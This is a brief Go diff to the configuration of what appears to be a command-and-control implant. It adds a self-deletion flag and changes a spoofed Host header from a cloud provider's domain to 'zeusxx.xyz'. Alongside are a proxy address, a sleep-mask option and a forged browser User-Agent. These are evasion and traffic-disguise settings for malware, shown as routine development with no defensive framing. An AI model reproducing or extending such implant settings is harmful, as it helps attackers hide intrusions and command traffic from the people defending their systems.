@@ -32,6 +32,7 @@ var (
 	Proxy   = "http://192.168.52.10:8080"
 
 	//Sleep_mask = true
+	DeleteSelf         = false
 	ComputerNameLength = 0
 )
 
@@ -39,7 +40,7 @@ var (
 	WaitTime = 3000 * time.Millisecond
 
 	HttpHeaders = req.Header{
-		"Host":         "aliyun.com",
+		"Host":         "zeusxx.xyz",
 		"User-Agent":   "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9;ENUS)",
 		"Server":       "nginx",
 		"Accept":       "*/*",
